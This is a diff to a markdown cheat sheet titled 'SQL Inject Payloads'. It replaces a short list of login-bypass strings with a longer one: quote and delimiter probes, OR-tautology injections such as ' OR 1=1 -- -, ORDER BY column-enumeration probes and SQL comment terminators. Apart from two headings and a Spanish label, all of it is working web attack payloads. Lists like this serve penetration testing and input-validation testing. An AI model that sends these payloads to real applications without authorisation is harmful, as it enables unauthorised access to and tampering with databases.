@@ -1,26 +1,42 @@
-# SQL Inject
+# SQL Inject Payloads
 
-admin' --
+'
+''
+`
+``
+,
+"
+""
+/
+//
+\
+\\
+;
+' or "
+-- or # 
+' OR '1
+' OR 1 -- -
+" OR "" = "
+" OR 1 = 1 -- -
+' OR '' = '
+'='
+'LIKE'
+'=0--+
+ OR 1=1
+' OR 'x'='x
+' AND id IS NULL; --
 
-admin' #
+1' ORDER BY 1--+
+1' ORDER BY 2--+
+1' ORDER BY 3--+
 
-admin'/*
+Comentarios:
 
-' OR 1=1 --
-
-' OR 1=1 @
-
-' OR 1=1 #
-
-' OR 1=1/*
-
-') OR '1'='1--
-
-') OR ('1'='1--
-
-" OR ""="
-
-'1'='1
+#
+/*
+-- -
+;%00
+`
 
 ## Links
 
